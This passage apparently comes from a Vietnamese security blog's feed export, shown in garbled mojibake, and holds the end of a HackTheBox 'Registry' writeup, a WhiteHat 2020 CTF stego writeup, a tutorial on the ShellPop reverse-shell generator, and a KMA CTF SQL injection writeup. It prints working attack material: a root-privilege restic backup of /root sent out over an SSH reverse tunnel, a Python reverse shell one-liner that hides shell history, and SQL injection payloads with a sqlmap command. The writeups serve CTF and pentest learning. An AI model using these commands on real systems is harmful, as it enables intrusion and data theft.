NOPASSWD: /usr/bin/restic backup -r rest* Táº­p trung háº¿t cÆ¡m gáº¡o vÃ o pháº§n nÃ y Ä‘á»ƒ láº¥y root =)).\nGiá»›i thiá»‡u sÆ¡ qua má»™t chÃºt, restic lÃ  1 opensource sá»­ dá»¥ng Ä‘á»ƒ backup, nÃ³i rÃµ hÆ¡n thÃ¬ mÃ¬nh cÅ©ng chá»‹u vÃ¬ cÃ¡i nÃ y quÃ¡ má»›i so vá»›i mÃ¬nh =)), cháº£ biáº¿t gÃ¬ cáº£.\nNgá»“i Ä‘á»c document cá»§a nÃ³ táº¡i Ä‘Ã¢y https://restic.readthedocs.io/en/latest/ Sau má»™t khoáº£ng thá»i gian Ä‘á»c doc vá»›i lÃªn máº¡ng tÃ¬m exam cÃ¢u lá»‡nh cá»§a nÃ³ thÃ¬ má»›i biáº¿t lÃ  nÃ³ cáº§n 1 server Ä‘á»ƒ backup. NgÆ°á»i báº¡n chÆ¡i cÃ¹ng mÃ¬nh báº£o lÃ  nÃ³ cÃ³ 1 restic server, nÃ³ tá»± Ä‘á»™ng cháº¡y trÃªn cá»•ng 8000. MÃ¬nh ngá»“i táº£i file binary cá»§a nÃ³ á»Ÿ Ä‘Ã¢y https://github.com/restic/rest-server/releases\nâœ Downloads ./rest-server-0.9.7-linux-amd64 rest-server 0.9.7 compiled with go1.10 on linux/amd64 Data directory: /tmp/restic Authentication disabled Private repositories disabled Starting server on :8000 Cháº¡y server xong thÃ¬ táº¡o repo restic Ä‘á»ƒ lÆ°u file backup\nâœ Downloads apt-get install restic âœ Downloads restic init -r /tmp/restic enter password for new repository: enter password again: created restic repository 03ab053496 at /tmp/restic Please note that knowledge of your password is required to access the repository. Losing your password means that your data is irrecoverably lost. Äiá»u cáº§n lÃ m bÃ¢y giá» lÃ  Ã¡nh xáº¡ cá»•ng 8000 tá»« mÃ¡y mÃ¬nh lÃªn machine cÅ©ng trÃªn cá»•ng 8000 luÃ´n cho nhanh (thá»±c ra cho dá»… nhá»› =))). Sá»­ dá»¥ng ssh Ã¡nh xáº¡ qua user bolt. Ã€ mÃ  ban Ä‘áº§u mÃ¬nh dÃ¹ng www-data nhÆ°ng mÃ  cháº£ hiá»ƒu Ã¡nh xáº¡ lÃªn kiá»ƒu gÃ¬, biáº¿t má»—i Ã¡nh xáº¡ qua ssh thÃ¬ dÃ¹ng qua tháº±ng bolt luÃ´n. NhÆ°ng cháº³ng hiá»ƒu kiá»ƒu gÃ¬ tháº±ng www-data cÅ©ng xÃ i Ä‘Æ°á»£c luÃ´n. NghÄ© ngáº«m 1 há»“i hÃ³a ra lÃ  nÃ³ cháº¡y trÃªn quyá»n root cÃ¡i lá»‡nh restic =)).\nâœ registry ssh -i id_rsa -R 8000:127.0.0.1:8000 bolt@10.10.10.159 Sá»­ dá»¥ng restic vá»›i quyá»n sudo backup thÆ° má»¥c /root\nwww-data@bolt:~/html$ sudo /usr/bin/restic backup -r rest:http://127.0.0.1:8000 /root \u0026lt;n/restic backup -r rest:http://127.0.0.1:8000 /root enter password for repository: 123123 password is correct found 2 old cache directories in /var/www/.cache/restic, pass --cleanup-cache to remove them scan [/root] scanned 10 directories, 14 files in 0:00 [0:01] 100.00% 28.066 KiB / 28.066 KiB 24 / 24 items 0 errors ETA 0:00 duration: 0:01 snapshot e5ef88b3 saved www-data@bolt:~/html$ Ngon, lÆ°u snapshot Ä‘Æ°á»£c vá» mÃ¡y mÃ¬nh rá»“i, Ä‘iá»u quan trá»ng giá» lÃ  tÃ¬m lá»‡nh Ä‘á»ƒ Ä‘á»c nÃ³ ra thÃ´i. Ngá»“i cat máº¥y cÃ¡i folder trong /tmp/restic mÃ  nÃ³ mÃ£ hÃ³a háº¿t luÃ´n, nhÃ¬n nhÆ° kiá»ƒu blockchain =)), sá»£ vl. Ngá»“i Ä‘á»c doc tháº¥y Ä‘oáº¡n nÃ y, hÃ³a ra lÃ  nÃ³ dÃ¹ng restore chá»© nÃ³ Ä‘áº¿ch Ä‘á»c Ä‘Æ°á»£c kiá»ƒu bt =)).\nâœ restic restic -r /tmp/restic restore e5ef88b3 --target /tmp/restic-root enter password for repository: repository 03ab0534 opened successfully, password is correct restoring \u0026lt;Snapshot e5ef88b3 of [/root] at 2020-02-10 06:26:17.454661805 +0000 UTC by root@bolt\u0026gt; to /tmp/restic-root Xong rá»“i, vÃ o /tmp/restic-root mÃ  Ä‘á»c cá» cuá»‘i thÃ´i ;))\nâœ restic cd /tmp/restic-root âœ restic-root ;s zsh: command not found: s âœ restic-root ls root âœ restic-root cd root âœ root ls config.yml cron.sh root.txt Funfact  Cay 1   Cay 2: Thá» luÃ´n cháº£ biáº¿t cÃ¡i gÃ¬ tháº±ng restic, khai thÃ¡c machine nÃ y khÃ¡ khÃ³ Ä‘á»‘i vá»›i mÃ¬nh. Cay 3: Äang suy nghÄ© nhÆ°ng khÃ¡ lÃ  cay.  Thanks  Nguyen Van Khanh B Nguyen Xuan Hoa  ","permalink":"https://minhtuanact.github.io/content/post/writeup-htb-registry/","summary":"Táº£ thá»±c VÃ o má»™t ngÃ y Ä‘áº¹p trá»i (Ã  thá»±c ra thÃ¬ cÅ©ng khÃ´ng Ä‘áº¹p láº¯m, trá»i vá»«a mÆ°a vá»«a rÃ©t cháº£ Ä‘i chÆ¡i Ä‘Æ°á»£c Ä‘Ã¢u) thÃ¬ cÃ³ ngÆ°á»i báº¡n mÃ¬nh trong team báº£o chÆ¡i hackthebox vÃ  Ä‘ang cÃ³ lá»—i. ÄÆ°á»£c cÃ¡i mÃ¬nh cÅ©ng nhiá»‡t tÃ¬nh + phÃ¡ hoáº¡i nÃªn vÃ o giÃºp tÃ½ cho vui.\nStart Recon âœ ~ ./nmapAutomator.sh 10.10.10.159 all Running a all scan on 10.10.10.159 Host is likely running Linux ---------------------Starting Nmap Quick Scan--------------------- Starting Nmap 7.","title":"Writeup Htb Registry"},{"content":"Misc 01 (Point: 360) File cÃ¡c báº¡n cÃ³ thá»ƒ download táº¡i Ä‘Ã¢y File\nÄáº§u tiÃªn thÃ¬ Ä‘Ã¢y lÃ  file png, sá»­ dá»¥ng zsteg xem bÃªn trong nÃ y cÃ³ gÃ¬ khÃ´ng. Tháº¥y cÃ³ 1 file áº£nh ná»¯a vÃ  1 Ä‘oáº¡n Comment Find the password to get the colors using stego tool. Extract file áº£nh ra xem cÃ³ gÃ¬ bÃªn trong\nâœ misc01 zsteg -e \u0026#34;extradata:0\u0026#34; Trip_to_Hoi_An.png \u0026gt; qr.png Ta extract ra Ä‘Æ°á»£c 1 file qr. MÃ¬nh Ä‘Æ°á»£c 1 ngÆ°á»i anh trong team viáº¿t cho Ä‘oáº¡n code replace máº¥y Ä‘iá»ƒm trong cÃ¡i mÃ£ QR nÃ y rá»“i khÃ´i phá»¥c láº¡i Ä‘Æ°á»£c mÃ£ QR ban Ä‘áº§u. Code: from PIL import Image im = Image.open(\u0026#39;qr (1).png\u0026#39;) w, h = im.size print(w, h) rgb_im = im.convert(\u0026#39;RGB\u0026#39;) im1 = Image.new(im.mode, (100, 100), \u0026#34;white\u0026#34;) OFFSET = 5 arr = [] for row in range(int(h/7+1)): tmp = [] for col in range(int(w/7+1)): print((3 + row*7, col*7 + 3)) color = rgb_im.getpixel((3 + row*7, col*7 + 3)) if color != (221, 140, 255): a = 0 im1.putpixel((row + 1, col + 1), (0, 0, 0)) else: a = 1 im1.putpixel((row + 1, col + 1), (255, 255, 255)) tmp.append(a) arr.append(tmp) print(arr) im1.save(\u0026#39;out2.png\u0026#39;)\nQuÃ©t mÃ£ QR ta thu Ä‘Æ°á»£c má»™t Ä‘oáº¡n text The password for this picture is: RGB\nVáº­y máº­t kháº©u cá»§a bá»©c áº£nh lÃ  RGB. MÃ¬nh Ä‘Ã£ thá»­ máº¥y tools nhÆ° steghide nhÆ°ng mÃ  steghide khÃ´ng há»— trá»£ file PNG, vÃ  anh teamlead cá»§a mÃ¬nh nháº¯n báº£o thá»­ stegosuite xem, thÃ¬ cÅ©ng cháº¡y Ä‘i thá»­, cÆ¡ mÃ  stegosuite khÃ´ng há»— trá»£ PNG, Ä‘Ã nh pháº£i convert file PNG sang BMP rá»“i nÃ©m password vÃ o thá»­. Extract thÃ nh cÃ´ng Ä‘Æ°á»£c 1 Ä‘oáº¡n text Ä‘Æ°á»£c giáº¥u vÃ o Ä‘Ã¢y.\nHere is your colors: 1196, 152 818, 504 167, 465 1424, 680 786, 309 448, 383 1198, 302 187, 43 341, 280 27, 477 ÄÃ¢y chÃ­nh lÃ  tá»a Ä‘á»™ láº¥y mÃ£ mÃ u trong bá»©c áº£nh kia. Viáº¿t 1 Ä‘oáº¡n code Ä‘á»ƒ láº¥y flag thÃ´i nÃ o.\nfrom PIL import Image im = Image.open(\u0026#39;Trip_to_Hoi_An.png\u0026#39;) w, h = im.size code = [\u0026#39;1196, 152\u0026#39;, \u0026#39;818, 504\u0026#39;, \u0026#39;167, 465\u0026#39;, \u0026#39;1424, 680\u0026#39;, \u0026#39;786, 309\u0026#39;, \u0026#39;448, 383\u0026#39;, \u0026#39;1198, 302\u0026#39;, \u0026#39;187, 43\u0026#39;, \u0026#39;341, 280\u0026#39;, \u0026#39;27, 477\u0026#39;] print(w, h) listcode = [] for i in code: listcode.append(im.getpixel((int(i.split(\u0026#39;, \u0026#39;)[0]), int(i.split(\u0026#39;, \u0026#39;)[1])))) flag = [] for i in listcode: [flag.append(chr(i[s])) for s in range(3)] print \u0026#39;\u0026#39;.join(flag)  Flag WhiteHat{sha1(w3LC0m3_t0_HOI_AN_4nc13nt_t0wn)}\n Misc 03 (Point: 280) CÃ¡i bÃ i nÃ y thÃ¬ Ä‘á»™ khá»‘n náº¡n khá»i nÃ³i rá»“i. Äá»ƒ mÃ¬nh cho cÃ¡c báº¡n xem cÃ¡i Ä‘á»™ khá»‘n náº¡n cá»§a bÃ i nÃ y nÃ³ Ä‘áº¿n Ä‘Ã¢u nhÃ©. áº¢nh cÃ¡c báº¡n cÃ³ thá»ƒ táº£i táº¡i Ä‘Ã¢y file\nVáº«n lÃ  áº£nh png, chÃºng ta láº¡i sá»­ dá»¥ng zsteg Ä‘á»ƒ tÃ¬m thá»­ xem trong áº£nh nÃ y cÃ³ gÃ¬ khÃ´ng.\nVáº«n lÃ  cÃ³ 1 file ná»¯a trong áº£nh nÃ y, extract ra ngoÃ i xem nÃ³ lÃ  gÃ¬ nÃ o.\nâœ misc03 zsteg -e \u0026quot;extradata:0\u0026quot; pied_piper.png \u0026gt; file âœ misc03 file file file: data Cháº£ biáº¿t nÃ³ lÃ  cÃ¡i file quáº§n quÃ¨ gÃ¬ cáº£, Ä‘Ãºng lÃ  pháº£i theo phÆ°Æ¡ng phÃ¡p tÃ¢m linh, Ä‘oÃ¡n ra file nÃ y Ä‘Æ°á»£c mÃ£ hÃ³a báº±ng XOR, thá»­ bruteforce xem cÃ³ Ä‘Æ°á»£c ra cÃ¡i quáº§n quÃ¨ gÃ¬ khÃ´ng. Sá»­ dá»¥ng xortools nhÆ° sau\nâœ misc03 xortool -l 1 -b file 256 possible key(s) of length 1: F G D E B ... Found 0 plaintexts with 95.0%+ valid characters See files filename-key.csv, filename-char_used-perc_valid.csv Kiá»ƒm tra trong thÆ° má»¥c out thÃ¬ ta tháº¥y 1 file áº£nh PNG, Ä‘Ãºng lÃ  phÆ°Æ¡ng phÃ¡p tÃ¢m linh tháº­t =))\nNhÃ¬n quáº£ mÃ£ hÃ³a kiá»ƒu nÃ y thÃ¬ mÃ¬nh cá»© chui vÃ o cÃ¡i trang https://www.dcode.fr/ nÃ y ngÃ³ xem cÃ¡i nÃ o giá»‘ng k. ThÃ¬ tÃ¬m Ä‘Æ°á»£c cÃ¡i mÃ£ hÃ³a nÃ y https://www.dcode.fr/pigpen-cipher. Xong rá»“i, decode báº±ng cÆ¡m ta sáº½ cÃ³ flag.\n","permalink":"https://minhtuanact.github.io/content/post/writeup-whitehat-2020/","summary":"Misc 01 (Point: 360) File cÃ¡c báº¡n cÃ³ thá»ƒ download táº¡i Ä‘Ã¢y File\nÄáº§u tiÃªn thÃ¬ Ä‘Ã¢y lÃ  file png, sá»­ dá»¥ng zsteg xem bÃªn trong nÃ y cÃ³ gÃ¬ khÃ´ng. Tháº¥y cÃ³ 1 file áº£nh ná»¯a vÃ  1 Ä‘oáº¡n Comment Find the password to get the colors using stego tool. Extract file áº£nh ra xem cÃ³ gÃ¬ bÃªn trong\nâœ misc01 zsteg -e \u0026#34;extradata:0\u0026#34; Trip_to_Hoi_An.png \u0026gt; qr.png Ta extract ra Ä‘Æ°á»£c 1 file qr.","title":"[Writeup] Whitehat Grand Prix 06 - 2020"},{"content":"Báº¡n Ä‘Ã£ chÃ¡n cáº£nh lÆ°u láº¡i cÃ¡c lá»‡nh shell trÃªn mÃ¡y tÃ­nh cá»§a mÃ¬nh, vÃ  báº¡n Ä‘Ã£ má»‡t má»i khi Ä‘i tÃ¬m chÃºng á»Ÿ Ä‘Ã¢u má»—i khi mÃ¬nh cáº§n. Äá»ƒ giáº£i quyáº¿t viá»‡c nÃ y, Shellpop Ä‘Æ°á»£c sinh ra vá»›i vÃ´ vÃ n cÃ¡c tiá»‡n Ã­ch mÃ  nÃ³ Ä‘em láº¡i, giá» Ä‘Ã¢y báº¡n sáº½ khÃ´ng cáº§n pháº£i lÆ°u láº¡i vÃ  Ä‘i tÃ¬m cÃ¡c lá»‡nh shell má»—i khi cáº§n ná»¯a.\nAbout CÃ´ng cá»¥ nÃ y Ä‘Æ°á»£c phÃ¡t triá»ƒn bá»Ÿi Andre Marques vÃ  Ä‘Ã¢y lÃ  má»™t mÃ£ nguá»“n má»Ÿ nÃªn ai cÃ³ báº¥t ká»³ Ã½ tÆ°á»Ÿng nÃ o hay ho thÃ¬ tham gia vÃ o cÃ¹ng phÃ¡t triá»ƒn nhÃ©\nGithub: https://github.com/0x00-0x00/ShellPop\nCÃ i Ä‘áº·t ChÆ°Æ¡ng trÃ¬nh báº¯t buá»™c cÃ i Python 2.7\nÄáº§u tiÃªn chÃºng ta cáº§n pháº£i clone git vá»\ngit clone https://github.com/0x00-0x00/ShellPop.git Tiáº¿p theo gÃµ lá»‡nh cd Shellpop/\nThá»±c hiá»‡n cÃ i Ä‘áº·t cÃ¡c dá»‹ch vá»¥ báº¯t buá»™c\nroot@kali# apt-get install python-argcomplete metasploit-framework -y root@kali# pip install -r requirements.txt Báº¯t Ä‘áº§u cÃ i Ä‘áº·t\nroot@kali# python setup.py install Váº­y lÃ  ta Ä‘Ã£ cÃ i Ä‘áº·t xong, báº¯t Ä‘áº§u vÃ o sá»­ dá»¥ng thÃ´i.\nSá»­ dá»¥ng root@kali:~/Documents/ShellPop# shellpop --help usage: shellpop [-h] [-l] [-H HOST] [-P PORT] [--number NUMBER] [--shell SHELL] [--reverse] [--bind] [--payload PAYLOAD] [--xor] [--base64] [--urlencode] [--ipfuscate] [--obfuscate-small] [--handler] [--stager STAGER] [--http-port HTTP_PORT] [--powershell-x86] [--powershell-x64] [--powershell-random-case] [--clip] Options: -h, --help show this help message and exit -l, --list List of available shells -H HOST, --host HOST IP to be used in connectback (reverse) shells. -P PORT, --port PORT Port to be used in reverse/bind shell code. --number NUMBER Shell code index number --shell SHELL Terminal shell to be used when decoding some encoding scheme. --handler Use handler, if possible. Shell Types: --reverse Victim communicates back to the attacking machine. --bind Open up a listener on the victim machine. --payload PAYLOAD Choose the payload Encoders Options: --xor Enable XOR obfuscation --base64 Encode command in base64. --urlencode Encode the command in URL encoding. Obfuscation Options: --ipfuscate Obfuscate IP address. --obfuscate-small Obfuscated command will be as small as possible. Staging Options: --stager STAGER Use staging for shells --http-port HTTP_PORT HTTP staging port to be used PowerShell options: --powershell-x86 Use powershell 32-bit executable. --powershell-x64 Use powershell 64-bit executable. --powershell-random-case Use random-case in powershell payloads. Miscellaneous: --clip Copy payload to your clipboard automatically. Pop shells like a master. For more help visit:https://github.com/0x00-0x00/ShellPop Danh sÃ¡ch shell Shellpop cung cáº¥p cho ta khÃ¡ nhiá»u tiá»‡n Ã­ch, báº¡n cÃ³ thá»ƒ liá»‡t kÃª táº¥t cáº£ cÃ¡c shell cá»§a shellpop báº±ng cÃ¡ch sá»­ dá»¥ng tÃ¹y chá»n lá»‡nh \u0026ndash;list VÃ­ dá»¥:\nroot@kali:~/Documents/ShellPop# shellpop --list shellpop v0.36 Contributors: @zc00l,@touhidshaikh,@lowfuel [+] Bind shells: 1. Python TCP +pty 2. Python UDP 3. Perl TCP 4. Perl UDP 5. PHP TCP 6. PHP UDP 7. Ruby TCP 8. Ruby UDP 9. Netcat (OpenBSD) TCP 1. Netcat+coproc (OpenBSD) UDP 2. Netcat (Traditional) TCP 3. AWK TCP 4. socat UDP 5. Windows Powershell TCP 6. Windows Powershell Nishang TCP [+] Reverse shells: 1. Python TCP +pty 2. Python UDP 3. PHP TCP 4. Ruby TCP 5. Perl TCP 01 6. Perl TCP 02 7. Perl UDP [nc -lkvup PORT] 8. Bash TCP 9. Windows Powershell TCP 10. TCLsh TCP 11. Ncat TCP 12. Ncat SSL TCP 13. Netcat (Traditional) UDP 14. Netcat (Traditional) TCP 15. Netcat (OpenBSD) mkfifo TCP 16. Netcat (OpenBSD) mknod TCP 17. Telnet mkfifo TCP 18. Telnet mknod TCP 19. openssl TCP 20. socat TCP 21. awk TCP 22. awk UDP 23. Windows Bat2Ncat TCP 24. Windows Powershell Shellcode-Injection a.k.a BloodSeeker TCP - x64 25. Windows Powershell Tiny TCP 26. Windows Powershell Nishang TCP 27. Windows Powershell Nishang ICMP 28. Windows Bat2Meterpreter TCP 29. Groovy TCP á» Ä‘Ã¢y chÃºng ta tháº¥y Ä‘Æ°á»£c lÃ  shellpop há»— trá»£ Ä‘á»§ loáº¡i ngÃ´n ngá»¯ tá»« Python, PHP, Ruby, Perl cho Ä‘áº¿n Windows Powershell, \u0026hellip; Shellpop cÃ²n há»— trá»£ cáº£ TCP, UDP, ICMP, \u0026hellip;\nSao chÃ©p vÃ o clipboard Shellpop sáº½ khÃ´ng cho báº¡n lÃ£ng phÃ­ má»™t giÃ¢y phÃºt nÃ o cáº£ (vÃ¬ má»¥c Ä‘Ã­ch cá»§a chÆ°Æ¡ng trÃ¬nh nÃ y Ä‘Æ°á»£c táº¡o ra lÃ  giÃºp ngÆ°á»i dÃ¹ng khÃ´ng lÃ£ng phÃ­ thá»i gian mÃ ). Vá»›i tÃ¹y chá»n --clip, ngay láº­p tá»©c shell mÃ  báº¡n vá»«a táº¡o ra sáº½ Ä‘Æ°á»£c sao chÃ©p vÃ o clipboard cá»§a báº¡n rá»“i. Viá»‡c cá»§a báº¡n chá»‰ viá»‡c paste ra mÃ  thÃ´i.\nBind shells vÃ  Reverse shells ChÃºng ta táº­p trung vÃ o 2 váº¥n Ä‘á» chÃ­nh lÃ  Bind shells vÃ  Reverse shells\nChÃºng ta thá»­ táº¡o 1 reverse shells xem sao nhÃ©\ná» Ä‘Ã¢y mÃ¬nh táº¡o 1 Reverse Shell á»Ÿ IP trÃªn eth0 vÃ  cá»•ng 4444 Command line examples\nroot@kali:~# shellpop --host eth0 --port 4444 --reverse --number 1 [+] Execute this code in remote target: python -c \u0026#34;import os;import pty;import socket;jbNZvh=\u0026#39;192.168.19.100\u0026#39;;GCVfMeJlExfIfs=4444;ugQNFu=socket.socket(socket.AF_INET,socket.SOCK_STREAM);ugQNFu.connect((jbNZvh,GCVfMeJlExfIfs));os.dup2(ugQNFu.fileno(),0);os.dup2(ugQNFu.fileno(),1);os.dup2(ugQNFu.fileno(),2);os.putenv(\u0026#39;HISTFILE\u0026#39;,\u0026#39;/dev/null\u0026#39;);pty.spawn(\u0026#39;/bin/bash\u0026#39;);ugQNFu.close();\u0026#34; [+] This shell DOES NOT have a handler set.  shellpop: gá»i chÆ°Æ¡ng trÃ¬nh shellpop --host: XÃ¡c Ä‘á»‹nh Ä‘á»‹a chá»‰ Ä‘Ã­ch --port: XÃ¡c Ä‘á»‹nh cá»•ng --reverse: Chá»n tÃ¹y chá»n reverse --number: XÃ¡c Ä‘á»‹nh kiá»ƒu mÃ  mÃ¬nh muá»‘n táº¡o shell, vá»›i sá»‘ thá»© tá»± á»Ÿ tÃ¹y chá»n --list bÃªn trÃªn.  Tá»± Ä‘á»™ng hoÃ n thÃ nh Vá»›i chá»©c nÄƒng nÃ y, báº¡n cÃ³ thá»ƒ quÃªn luÃ´n cÃ¡i --list, --number kia Ä‘i, dÆ°á»›i Ä‘Ã¢y lÃ  vÃ­ dá»¥ cho cÃ¡c báº¡n hiá»ƒu. Chá»‰ cáº§n bÃ¡m vÃ o Ä‘á»‘i sá»‘ cá»§a --payload lÃ  báº¡n cÃ³ thá»ƒ tá»± táº¡o cho mÃ¬nh 1 shell mong muá»‘n rá»“i.\nMÃ£ hÃ³a Hiá»‡n táº¡i chÆ°Æ¡ng trÃ¬nh cung cáº¥p 3 loáº¡i mÃ£ hÃ³a lÃ  XOR, Base64 vÃ  URL. ChÃºng ta cÃ³ thá»ƒ sá»­ dá»¥ng tá»«ng loáº¡i mÃ£ hÃ³a hoáº·c cÃ³ thá»ƒ \u0026ldquo;mix\u0026rdquo; nhiá»u loáº¡i vá»›i nhau.\nVÃ­ dá»¥: Handlers TÃ¹y chá»n nÃ y giÃºp báº¡n giáº£m thiá»ƒu tá»‘i Ä‘a viá»‡c táº¡o vÃ  connect shell. VÃ­ dá»¥: Tá»•ng káº¿t Shellpop lÃ  má»™t cÃ´ng cá»¥ tuyá»‡t vá»i cho nhá»¯ng bÃ i pentest. CÃ²n ráº¥t nhiá»u tiá»‡n Ã­ch hay mÃ  cÃ´ng cá»¥ Ä‘em láº¡i, báº¡n Ä‘á»c tÃ¬m hiá»ƒu dáº§n dáº§n nhÃ©. Náº¿u tháº¥y bÃ i viáº¿t há»¯u Ã­ch thÃ¬ Ä‘á»ƒ láº¡i 1 share 1 upvote Ä‘á»ƒ mÃ¬nh cÃ³ Ä‘á»™ng lá»±c ra cÃ¡c bÃ i viáº¿t hay hÆ¡n nhÃ©.\n","permalink":"https://minhtuanact.github.io/content/post/tao-vo-van-lenh-shell-chiem-quyen-truy-cap-bang-cong-cu-shellpop-tren-linux/","summary":"Báº¡n Ä‘Ã£ chÃ¡n cáº£nh lÆ°u láº¡i cÃ¡c lá»‡nh shell trÃªn mÃ¡y tÃ­nh cá»§a mÃ¬nh, vÃ  báº¡n Ä‘Ã£ má»‡t má»i khi Ä‘i tÃ¬m chÃºng á»Ÿ Ä‘Ã¢u má»—i khi mÃ¬nh cáº§n. Äá»ƒ giáº£i quyáº¿t viá»‡c nÃ y, Shellpop Ä‘Æ°á»£c sinh ra vá»›i vÃ´ vÃ n cÃ¡c tiá»‡n Ã­ch mÃ  nÃ³ Ä‘em láº¡i, giá» Ä‘Ã¢y báº¡n sáº½ khÃ´ng cáº§n pháº£i lÆ°u láº¡i vÃ  Ä‘i tÃ¬m cÃ¡c lá»‡nh shell má»—i khi cáº§n ná»¯a.\nAbout CÃ´ng cá»¥ nÃ y Ä‘Æ°á»£c phÃ¡t triá»ƒn bá»Ÿi Andre Marques vÃ  Ä‘Ã¢y lÃ  má»™t mÃ£ nguá»“n má»Ÿ nÃªn ai cÃ³ báº¥t ká»³ Ã½ tÆ°á»Ÿng nÃ o hay ho thÃ¬ tham gia vÃ o cÃ¹ng phÃ¡t triá»ƒn nhÃ©","title":"Táº¡o VÃ´ VÃ n Lá»‡nh Shell Chiáº¿m Quyá»n Truy Cáº­p Báº±ng CÃ´ng Cá»¥ Shellpop TrÃªn Linux"},{"content":"Má»Ÿ Ä‘áº§u  Vá»«a rá»“i cÃ³ 1 cuá»™c thi KMA CTF dÃ nh cho sinh viÃªn. MÃ¬nh cÅ©ng Ä‘Æ°á»£c tiáº¿p xÃºc vá»›i 1 bÃ i Web dÃ­nh SQL Injection  Äá» bÃ i \u0026lt;?php include \u0026#34;config.php\u0026#34;; function check_input($input) { $charset = \u0026#34;~0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%\u0026amp;\\()*+,-./:;\u0026lt;=\u0026gt;?@[]^_`{|}\u0026#34;; if (empty($input)) return false; for ($i = 0 ; $i \u0026lt; strlen($input); $i++) if(!strpos($charset,$input[$i])) return false; return true; } if(isset($_POST[\u0026#34;search_user_exist\u0026#34;])) { $username = $_POST[\u0026#34;username\u0026#34;]; $name = $_POST[\u0026#34;name\u0026#34;]; \u0026#34;hl_lines=5-6\u0026#34; if ( check_input($username) === false || check_input($name) === false) { die(\u0026#34;h4x0r detected\u0026#34;); } $sql = \u0026#34;SELECT id FROM users WHERE username=\u0026#39;$username\u0026#39; or name=\u0026#39;$name\u0026#39;\u0026#34;; $result = $conn-\u0026gt;query($sql); if ($result-\u0026gt;num_rows \u0026gt; 0) { die(\u0026#34;User exist\u0026#34;); } die(\u0026#34;No user\u0026#34;); } else { highlight_file(__FILE__); } ?\u0026gt; (Äá» bÃ i Ä‘Ã£ Ä‘Æ°á»£c custom 1 chÃºt so vá»›i Ä‘á» cá»§a KMA CTF)\nXÃ¡c Ä‘á»‹nh cÃ¡ch thá»©c táº¥n cÃ´ng   Äá»c code ta cÃ³ thá»ƒ tháº¥y Ä‘Æ°á»£c cÃ³ 1 chá»©c nÄƒng search_user_exist dÃ¹ng Ä‘á»ƒ search xem Ä‘Ã£ tá»“n táº¡i username hay name hay chÆ°a. NhÆ°ng Ä‘á»ƒ Ã½ Ä‘oáº¡n cÃ¢u lá»‡nh querry thÃ¬ cháº¯c cháº¯n chá»— nÃ y dÃ­nh sql injection. NhÆ°ng lÃ m tháº¿ nÃ o Ä‘á»ƒ khai thÃ¡c, mÃ¬nh pháº£i vÆ°á»£t qua Ä‘Æ°á»£c Ä‘oáº¡n function check_input kia Ä‘Ã£.\n  Theo function check_input thÃ¬ chá»‰ cho phÃ©p $charset = \u0026#34;~0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%\u0026amp;\\()*+,-./:;\u0026lt;=\u0026gt;?@[]^_`{|}\u0026#34;;  Váº­y lÃ  chÆ°Æ¡ng trÃ¬nh cháº·n kÃ½ tá»± ', space, vÃ  cháº·n cáº£ ~.\nVáº­y táº¡i sao cháº·n cáº£ dáº¥u ~, mÃ¬nh tháº¥y nÃ³ trong charset mÃ  :-?\nLÃ­ giáº£i cho Ä‘iá»u nÃ y vÃ¬ hÃ m strpos($charset,$input[$i]); nÃ³ sáº½ tÃ¬m vá»‹ trÃ­ xuáº¥t hiá»‡n Ä‘áº§u tiÃªn cá»§a $input[$i] trong charset. Do ~ Ä‘á»©ng Ä‘áº§u chuá»—i charset. Váº­y khi tÃ¬m dáº¥u ~, nÃ³ sáº½ tráº£ vá» giÃ¡ trá»‹ 0. VÃ  trong lá»‡nh if thÃ¬ if(!0) = true. Váº­y nÃ³ vÃ´ tÃ¬nh lá»c cáº£ kÃ½ tá»± ~.\n  XÃ¡c Ä‘á»‹nh Ä‘Æ°á»£c cÃ¡c kÃ½ tá»± nÃ o Ä‘Æ°á»£c phÃ©p qua thÃ¬ mÃ¬nh bypass qua cÃ¢u lá»‡nh query nÃ y thÃ´i. Sau má»™t há»“i tÃ¬m hiá»ƒu thÃ¬ trong SQL dáº¥u ' Ä‘Æ°á»£c thay báº±ng dáº¥u \\, dáº¥u space Ä‘Æ°á»£c thay báº±ng /**/. Váº­y muá»‘n bypass Ä‘Æ°á»£c cÃ¢u lá»‡nh luÃ´n Ä‘Ãºng thÃ¬ nhÆ° tháº¿ nÃ o:\nSELECT id FROM users WHERE username=\u0026#39;\\\u0026#39; or name=\u0026#39;OR/**/1=1#\u0026#39;  NÃ³ tÆ°Æ¡ng Ä‘Æ°Æ¡ng vá»›i cÃ¢u lá»‡nh\nSELECT id FROM users WHERE username=''' or name='OR 1=1 Sáº½ tráº£ vá» má»‡nh Ä‘á» luÃ´n Ä‘Ãºng.\n  Ta Ä‘Ã£ xÃ¡c Ä‘á»‹nh Ä‘Æ°á»£c username=\\, name=OR/**/1=1#\n  Sá»­ dá»¥ng sqlmap   Váº­y bÃ¢y giá» ta sáº½ táº¥n cÃ´ng nhÆ° tháº¿ nÃ o. ÄÃ¢y lÃ  Blind SQL Injection. Khi cÃ¢u lá»‡nh query Ä‘Ãºng thÃ¬ nÃ³ sáº½ tráº£ vá» User exist. Khi cÃ¢u lá»‡nh sai nÃ³ tráº£ vá» No user. Khi cÃ³ kÃ½ tá»± k thuá»™c charset nÃ³ tráº£ vá» h4x0r detected.\n  Äáº§u tiÃªn ta sáº½ truyá»n data cho sqlmap Ä‘á»ƒ sqlmap hiá»ƒu Ä‘Æ°á»£c\nCÃ¢u lá»‡nh:\nsqlmap -u http://192.168.19.89/test/index.php --data \u0026#34;search_user_exist\u0026amp;username=\\\u0026amp;name=OR/**/1=1#\u0026#34;   sqlmap bÃ¡o lá»—i k thá»ƒ injection Ä‘Æ°á»£c. Váº­y pháº£i giáº£i quyáº¿t nhÆ° tháº¿ nÃ o.\n  Do Ä‘Ã¢y lÃ  Blind SQL Injection nÃªn sqlmap sáº½ khÃ´ng biáº¿t Ä‘Æ°á»£c Ä‘Ã¢u lÃ  cÃ¢u lá»‡nh query Ä‘Ãºng, Ä‘Ã¢u lÃ  cÃ¢u lá»‡nh query sai, nÃªn sqlmap khÃ´ng tÃ¬m Ä‘Æ°á»£c gÃ¬. Sá»­ dá»¥ng cÃ¢u lá»‡nh --string Ä‘á»ƒ xÃ¡c Ä‘á»‹nh 1 pháº§n vÄƒn báº£n tráº£ vá» lÃ  Ä‘Ãºng. Tá»©c lÃ  responce tráº£ vá» cÃ³ Ä‘oáº¡n vÄƒn 